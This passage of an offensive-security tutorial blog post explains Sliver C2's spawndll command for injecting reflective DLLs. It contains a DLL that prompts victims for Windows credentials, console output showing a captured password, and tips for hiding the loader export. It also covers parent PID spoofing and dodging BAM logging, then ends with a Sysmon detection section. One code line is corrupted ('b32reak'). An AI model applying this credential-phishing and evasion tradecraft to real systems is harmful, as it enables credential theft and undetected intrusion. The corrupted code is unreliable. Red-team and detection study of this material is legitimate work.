+</span><span style="color:#75715e">#pragma comment(lib, &#34;Credui.lib&#34;)
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">extern</span> HINSTANCE hAppInstance;
+
+BOOL APIENTRY <span style="color:#a6e22e">DllMain</span>(
+  HINSTANCE hinstDLL,
+	DWORD  dwReason,
+	LPVOID lpReserved
+)
+{
+	<span style="color:#66d9ef">switch</span> (dwReason)
+	{
+	  <span style="color:#66d9ef">case</span> DLL_QUERY_HMODULE:
+		  <span style="color:#66d9ef">if</span>( lpReserved <span style="color:#f92672">!=</span> NULL )
+			  	<span style="color:#f92672">*</span>(HMODULE <span style="color:#f92672">*</span>)lpReserved <span style="color:#f92672">=</span> hAppInstance;
+		  <span style="color:#66d9ef">break</span>;
+	  <span style="color:#66d9ef">case</span> DLL_PROCESS_ATTACH:
+		  hAppInstance <span style="color:#f92672">=</span> hinstDLL;
+		  askForCreds(<span style="color:#ae81ff">3</span>);
+		  fflush(stdout);
+		  b32reak;
+	  <span style="color:#66d9ef">case</span> DLL_PROCESS_DETACH:
+	  <span style="color:#66d9ef">case</span> DLL_THREAD_ATTACH:
+	  <span style="color:#66d9ef">case</span> DLL_THREAD_DETACH:
+      <span style="color:#66d9ef">break</span>;
+	}
+	<span style="color:#66d9ef">return</span> TRUE;
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">askForCreds</span>(DWORD maxTries) {
+  ...
+}
+</code></pre></div><p>Note that I call <code>askForCreds</code> in <code>DllMain</code> and then use <code>fflush(stdout)</code> to make sure the output is written.
+If you forget that you may later not see any output from your print statements in the Sliver console.</p>
+<p>There is one more thing you can do for more stealth. The file
+<a href="https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/dll/src/ReflectiveLoader.c">ReflectiveLoader.c</a>
+contains the reflective loader and, as mentioned above, the DLL must export this function since it is the interface to the caller.
+That is, its name will appear in clear text in the export table.
+Leaving the default string <code>ReflectiveLeader</code> in the DLL would be careless, right?
+Don&rsquo;t be that guy.
+You can garble it a bit and later tell Sliver what the new name is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">...
+<span style="color:#75715e">/* 47 */</span> <span style="color:#75715e">// This is our position independent reflective DLL loader/injector
+</span><span style="color:#75715e"></span><span style="color:#75715e">/* 48 */</span> <span style="color:#75715e">#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
+</span><span style="color:#75715e"></span><span style="color:#75715e">/* 49 */</span> DLLEXPORT ULONG_PTR WINAPI NotARefl3ct1veL04d3r( LPVOID lpParameter )
+<span style="color:#75715e">/* 50 */</span> <span style="color:#75715e">#else
+</span><span style="color:#75715e"></span><span style="color:#75715e">/* 51 */</span> DLLEXPORT ULONG_PTR WINAPI NotARefl3ct1veL04d3r( VOID )
+<span style="color:#75715e">/* 52 */</span> <span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>...
+</code></pre></div><p>Build the project again, then open the DLL with a tool like <a href="https://github.com/hasherezade/pe-bear">PE-bear</a>
+and marvel at your obfuscated export table:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/37_sliver_c2_spawndll/reflective_dll_export_table.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>An non-suspicious entry in a DLL export table</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Get the new DLL over to the C2 server and run it.
+This time you have to use the <code>--export</code> argument to specify the name of the reflective loader function:</p>
+<pre tabindex="0"><code>sliver (PEACEFUL_EX-WIFE) &gt; spawndll --export NotARefl3ct1veL04d3r /tmp/reflective_dll.x64.dll
+
+[*] Tasked beacon PEACEFUL_EX-WIFE (661f65fd)
+
+[+] PEACEFUL_EX-WIFE completed task 661f65fd
+
+[*] Output:
+Wrong credentials: DESKTOP-QPADJJ1\tester:asdf
+Correct credentials: DESKTOP-QPADJJ1\tester:strongpasswordsarelong
+</code></pre><p>You should see the familiar dialog box asking for your credentials.
+Try to enter data and verify that the output is actually displayed in your Sliver console.</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/37_sliver_c2_spawndll/reflective_dll_askforcreds.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>The modified reflective DLL asks for credentials</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>This is all it takes to build a reflective DLL.
+Time to familiarize yourself with all the options you have to customize things:</p>
+<pre tabindex="0"><code>sliver (REALISTIC_BARITONE) &gt; spawndll --help
+
+Command: spawndll &lt;options&gt; &lt;filepath to DLL&gt; [entrypoint arguments]
+About: Load and execute a Reflective DLL in memory in a remote process.
+
+--process - Process to inject into.
+--export - Name of the export to call (default: ReflectiveLoader)
+
+
+Usage:
+======
+  spawndll [flags] filepath [arguments...]
+
+Args:
+=====
+  filepath   string         path the DLL file
+  arguments  string list    arguments to pass to the DLL entrypoint (default: [])
+
+Flags:
+======
+  -e, --export            string    Entrypoint of the Reflective DLL (default: ReflectiveLoader)
+  -h, --help                        display help
+  -k, --keep-alive                  don't terminate host process once the execution completes
+  -X, --loot                        save output as loot
+  -n, --name              string    name to assign loot (optional)
+  -P, --ppid              uint      parent process id (optional) (default: 0)
+  -p, --process           string    Path to process to host the shellcode (default: c:\windows\system32\notepad.exe)
+  -A, --process-arguments string    arguments to pass to the hosting process
+  -s, --save                        save output to file
+  -t, --timeout           int       command timeout in seconds (default: 60)
+</code></pre><p>To structure the flags, think of them the following way.
+First, you decide what you want to execute:</p>
+<ul>
+<li>DLL: specify a path to the reflective DLL, which must be present on your local machine.</li>
+<li>Function and Arguments: the name of the reflective loader function goes into <code>--export</code> and is <code>ReflectiveLoader</code> by default.
+If additional arguments are accepted, pass them after the path to the DLL.</li>
+</ul>
+<p>You have some control over the way you execute the DLL.
+Options are the same as for <code>sideload</code>:</p>
+<ul>
+<li>Pick an image for the sacrificial process: specify the executable with <code>--process</code> and <code>--process-arguments</code> are supported too
+The default is <code>notepad.exe</code> and Defender is (occasionally) not a fan of notepad doing weird things.</li>
+<li>Keep process alive when done: pass <code>--keep-alive</code> if you don&rsquo;t want that.</li>
+<li>Spoof the parent process: pass <code>--ppid</code> with the ID of an existing, suitable process.</li>
+</ul>
+<p>As usual you can get the output the way you like it:</p>
+<ul>
+<li>Save as loot: pass <code>--loot</code> to enable and define a <code>--name</code> for the output.</li>
+<li>Save to disk: enable with <code>--save</code>.</li>
+<li>Just watch: don&rsquo;t set any of these flags and you just get the output printed out.</li>
+</ul>
+<h3 id="using-existing-tools">Using existing tools</h3>
+<p>The primary use case for <code>spawndll</code> is running 3rd party tools that were developed as reflective DLLs.
+In the <a href="https://github.com/BishopFox/sliver/wiki/Using-3rd-party-tools#loading-reflective-dlls">Sliver wiki</a>
+you can find an example: the <a href="https://github.com/outflanknl/Ps-Tools">Ps-Tools Suite from Outflank</a>.
+This set of tools provides 6 reflective DLLs you can use to gather information about system processes.</p>
+<p>Clone this repository somewhere into the Windows target and open the Visual Studio project
+of any of the 6 tools. For example, pick <a href="https://github.com/outflanknl/Ps-Tools/tree/master/Src/Outflank-PsC-rDLL">Outflank-PsC-rDLL</a>.
+Visual Studio may ask you to retarget the solution, which should be ok to do.
+After that you should be able to build a release version.
+If you have trouble with that and a lot of faith in Outflank you could also
+use their <a href="https://github.com/outflanknl/Ps-Tools/tree/master/Outflank-PS-Tools">precompiled DLLs</a>.</p>
+<p>Now get that DLL over to your machine and run it to get information about
+processes and their network connections.
+Don&rsquo;t forget the arbitrary argument you have to pass which can be anything
+and will be ignored but which is required to make things work. I used <code>foo</code>:</p>
+<pre tabindex="0"><code>sliver (PEACEFUL_EX-WIFE) &gt; spawndll /tmp/Outflank-PsC.dll foo
+                                                                    
+[*] Tasked beacon PEACEFUL_EX-WIFE (619d5717)                       
+                                                                  
+[+] PEACEFUL_EX-WIFE completed task 619d5717                        
+                                                                    
+[*] Output:                                                         
+                                                                    
+--------------------------------------------------------------------
+                                                                    
+[+] ProcessName:   System                                           
+    ProcessID:     4             
+    PPID:          0 (Non-existent process)
+    CreateTime:    09/03/2023 20:59
+    Path:          C:\Windows\System32\ntoskrnl.exe
+    ImageType:     64-bit
+    CompanyName:   Microsoft Corporation
+    Description:   NT Kernel &amp; System
+    Version:       10.0.19041.2604
+
+&lt;-&gt; Session:       TCP
+    State:         ESTABLISHED
+    Local Addr:    192.168.122.61:445
+    Remote Addr:   192.168.122.111:42230
+
+--------------------------------------------------------------------
+...
+</code></pre><p>The other tools work in the same way.</p>
+<h2 id="implementation-details">Implementation details</h2>
+<h3 id="sliver-source-code">Sliver source code</h3>
+<p>Lets venture into the source code of <code>spawndll</code> to find out what exactly it does.
+Source code files below are relative to the root of the
+<a href="https://github.com/BishopFox/sliver/tree/v1.5.34">Sliver GitHub repo</a>, version v1.5.34.</p>
+<p>Assuming that you use the official Sliver client, whose code lives in <code>client/</code>,
+we have to start with function
+<a href="https://github.com/BishopFox/sliver/blob/v1.5.34/client/command/exec/spawndll.go#L35">SpawnDllCmd</a>
+defined in <code>client/command/exec/spawndll.go</code>.
+As you probably expect it merely parses arguments, reads the DLL from disk,
+sends all data with an RPC to the Sliver server and waits for a response to display.</p>
+<p>Turn your attention to the server, whose code is in <code>server/</code>.
+There is a handler called <a href="https://github.com/BishopFox/sliver/blob/v1.5.34/server/rpc/rpc-tasks.go#L242">SpawnDll</a>
+in <code>server/rpc/rpc-tasks.go</code>, which is responsible for forwarding the request to the selected beacon or session.
+Before it does that, it translates the name of the function you passed with the <code>--export</code> flag
+to an offset (<a href="https://github.com/BishopFox/sliver/blob/v1.5.34/server/rpc/rpc-tasks.go#L263">line 263</a>)
+using the <a href="https://github.com/BishopFox/sliver/blob/v1.5.34/server/rpc/rpc-tasks.go#L433">getExportOffsetFromMemory</a> function.
+It uses a library <a href="https://github.com/Binject/debug">github.com/Binject/debug/pe</a>,
+which parses the export table to get the offset of the function.
+Only this offset is passed along to the implant, not the real function name.</p>
+<p>The implant (code found under <code>implant/</code>) has a handler registered <a href="https://github.com/BishopFox/sliver/blob/v1.5.34/implant/sliver/handlers/handlers_windows.go#L63">here</a>
+in <code>implant/sliver/handlers/handlers_windows.go</code>.
+This <a href="https://github.com/BishopFox/sliver/blob/v1.5.34/implant/sliver/handlers/handlers_windows.go#L430">spawnDllHandler</a>
+just parses the request and calls the function <a href="https://github.com/BishopFox/sliver/blob/v1.5.34/implant/sliver/taskrunner/task_windows.go#L346">SpawnDll</a>
+in <code>implant/sliver/taskrunner/task_windows.go</code>.
+Readers of the <a href="../../post/learning_sliver_c2_10_sideload/">post about sideload</a> saw this function before, since <code>sideload</code> uses it too.
+It starts a new process with Go&rsquo;s <code>os/exec</code>, then injects the data (<code>VirtualAllocEx -&gt; WriteProcessMemory -&gt; VirtualProtectEx -&gt; CreateRemoteThread</code>)
+and starts execution at the offset previously calculated on the server.</p>
+<p>For details I refer to the <a href="../../post/learning_sliver_c2_10_sideload/">sideload post</a>.</p>
+<p>With execution passed to the reflective loader, the implant is now done and waits for output on stdout and stderr,
+which it will send back to the Sliver server.</p>
+<h3 id="review-of-the-reflective-loader">Review of the reflective loader</h3>
+<p>As you saw above, Sliver does not really have anything to do with the reflective loader.
+Sliver just expects that you give it a DLL that has a reflective loader inside of it.
+If you don&rsquo;t, the process it spawns will most likely just crash.</p>
+<p>The most popular implementation of a reflective loader which I could find is
+<a href="https://github.com/stephenfewer/ReflectiveDLLInjection">this one</a> by Stephen Fewer.
+It is also the one we used above to build our example DLL.</p>
+<p>In this part I briefly discuss how the reflective loader is implemented.
+You can find it in the file <a href="https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/dll/src/ReflectiveLoader.c">ReflectiveLoader.c</a>
+in the GitHub repository.
+However, its features are extremely similar to those of the Donut loader for PE files,
+which I&rsquo;ve discussed in greater detail in <a href="../../post/learning_sliver_c2_10_sideload/">post 10</a>.
+Therefore I keep this one short and assume you read and understood the previous post.</p>
+<p>Also note that the reflective loader code has plenty of very readable comments.
+You probably just want to read these instead of my post to get your information firsthand.
+Comments divide the function <a href="https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/dll/src/ReflectiveLoader.c#L51">ReflectiveLoader</a>
+into several steps:</p>
+<ul>
+<li>Step 0: Starting from the callers return address, it searches for a valid PE header to find the base address it has been loaded at.</li>
+<li>Step 1: The loader looks for addresses of some functions it needs, such as
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibraryA</a> from kernel32.dll
+and <code>NtFlushInstructionCache</code> from ntdll.dll.
+Both libraries are expected to be loaded already (which will always be the case) and their addresses are taken from the
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb">Process Environment Block</a> (PEB).
+The PEB is a per-process data structure containing information about the process such as the base addresses of kernel32.dll and ntdll.dll.
+The code further proceeds through the exports of these DLLs to find the functions.
+Instead of matching them by name the loader only knows hashes of the function names, which avoids including telltale strings into the reflective DLL.</li>
+<li>Steps 2/3: Copy the headers and sections of the reflective DLL into a new, permanent location in memory.
+This memory is allocated as RWX.</li>
+<li>Step 4: Process the reflective DLL&rsquo;s import table to load all dependencies.</li>
+<li>Step 5: Apply relocations of the reflective DLL.</li>
+<li>Step 6: Call the entrypoint of the reflective DLL.</li>
+</ul>
+<h2 id="detection">Detection</h2>
+<p>In <a href="../../post/learning_sliver_c2_10_sideload/#detection">post 10</a> I ran Sysmon
+with a medium verbosity <a href="https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml">configuration file</a>
+(sysmon-modular) to see what telemetry you can expect when using <code>sideload</code>.
+Here I did the same for <code>spawndll</code> and, since most of the code is similar, you should expect the same results.
+If you don&rsquo;t yet have Sysmon, see <a href="../../post/learning_sliver_c2_06_stagers_process_injection/#detection">here</a> for installation instructions.</p>
+<p>Below you can see the Sysmon events collected during a run of <code>spawndll --process &quot;C:/Windows/system32/mspaint.exe&quot; /tmp/reflective_dll.x64.dll</code>.
+Remember that the implant ran in a process &ldquo;StagerProcess.exe&rdquo;:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/37_sliver_c2_spawndll/spawndll_sysmon.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Sysmon events collected while using spawndll</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Sysmon collected the usual two events related to process injection:</p>
+<ul>
+<li>Event 10: process access with &ldquo;GrantedAccess&rdquo; &ldquo;0x1fffff&rdquo; from &ldquo;StagerProcess.exe&rdquo; to &ldquo;mspaint.exe&rdquo;</li>
+<li>Event 8: create remote threat from &ldquo;StagerProcess.exe&rdquo; to &ldquo;mspaint.exe&rdquo;</li>
+</ul>
+<p>Due to Slivers use of classic injection into a sacrificial process we can see events 10 and 8.
+As far as I know this cannot be avoided with Sliver unless you fork the implant and change the process injection technique.</p>
+<p>Forensics fun-fact of the day: there is one more event that seems to be related to <code>spawndll</code>, which is the one with ID 13 right before 10 and 8.
+You can see it here:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/37_sliver_c2_spawndll/spawndll_sysmon_bam.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Sysmon event 13 collected due to process creation</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-13-registryevent-value-set">Event 13</a>
+is a registry modification.
+If you run Sysmon for a little longer you will see quite a lot of them,
+which is why I always ignored them so far.
+Today however was the day I finally wanted to know a bit more.
+Since it reads a lot like the stager creating an &ldquo;mspaint.exe&rdquo; process the event looks to me as if it could also be an artifact of <code>spawndll</code>.
+But why would the implant write to the registry?</p>
+<p>Google brought up this <a href="https://forensafe.com/blogs/bam.html">website</a>
+which explains what the Windows Background Activity Monitor (BAM) is.
+One of the things it does is to maintain a list of all programs a user ran in the past 7 days,
+so it is likely BAM which creates the key.
+Look at the registry key seen in this event and you can see the entire list of your processes.</p>
+<p>If you wanted to avoid this logging you could instead run something like <code>spawndll --process &quot;C:/Windows/system32/find.exe&quot; /tmp/reflective_dll.x64.dll</code>.
+Since console applications are not logged by BAM you would not see such an event.</p>
+<p>With regards to the activity of the reflective loader itself I did not spot any events revealing its existence.</p>
+
+    </div>
+    
+    <footer>
+      <hr>
+      <p>
+  Published
+  
+    
+      by <span itemprop="author">Dominic Breuker</span>
+    
+  
+  <time itemprop="datePublished" datetime="2023-03-10T00:00:00&#43;00:00">
+    10 Mar, 2023
+  </time>
+  
+    in <span itemprop="articleSection"><a href="/categories/c2/">c2</a> and <a href="/categories/sliver/">sliver</a></span>
+  
+  
+    and tagged <a href="/tags/c2/">c2</a>, <a href="/tags/dll/">DLL</a>, <a href="/tags/implant/">implant</a>, <a href="/tags/pe/">PE</a>, <a href="/tags/reflective-dll-loader/">reflective DLL loader</a>, <a href="/tags/sliver/">sliver</a>, <a href="/tags/spwandll/">spwandll</a> and <a href="/tags/tutorial/">tutorial</a>
+  
+  using <span itemprop="wordCount">3024</span> words.
+</p>
+
+      
+
+
+  <aside>
+    <header>Related Content</header>
+    <ul>
+      
+        <li><a href="/post/learning_sliver_c2_10_sideload/">Learning Sliver C2 (10) - Sideload</a>
+        <time datetime="37M">37 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_09_execute_assembly/">Learning Sliver C2 (09) - Execute Assembly</a>
+        <time datetime="29M">29 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_08_implant_basics/">Learning Sliver C2 (08) - Implant Basics</a>
+        <time datetime="20M">20 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_06_stagers_process_injection/">Learning Sliver C2 (07) - Stagers: Process Injection</a>
+        <time datetime="22M">22 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_06_stagers/">Learning Sliver C2 (06) - Stagers: Basics</a>
+        <time datetime="26M">26 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_05_transports_in_detail_dns/">Learning Sliver C2 (05) - Transports in Detail: DNS</a>
+        <time datetime="9M">9 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_04_transports_in_detail_http_and_https/">Learning Sliver C2 (04) - Transports in Detail: HTTP and HTTPS</a>
+        <time datetime="19M">19 minutes</time>
+      
+    </ul>
+  </aside>
+
+
+    </footer>
+  </article>
+</main>
+    <footer>
+  
+
+</footer>
+  </body>
+</html>
